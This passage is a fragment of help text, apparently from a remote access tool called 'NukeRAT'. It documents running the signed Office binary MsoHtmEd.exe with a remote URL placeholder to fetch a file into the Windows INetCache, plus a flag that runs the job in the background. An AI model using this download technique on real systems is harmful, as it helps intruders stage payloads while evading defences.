ABOUT

    into INetCache.

USAGE:
    MsoHtmEd.exe {REMOTEURL}

EXAMPLES:
    MsoHtmEd.exe {REMOTEURL}

NUKERAT FLAGS:

    -bg             Fork and run without waiting for output

    Example:
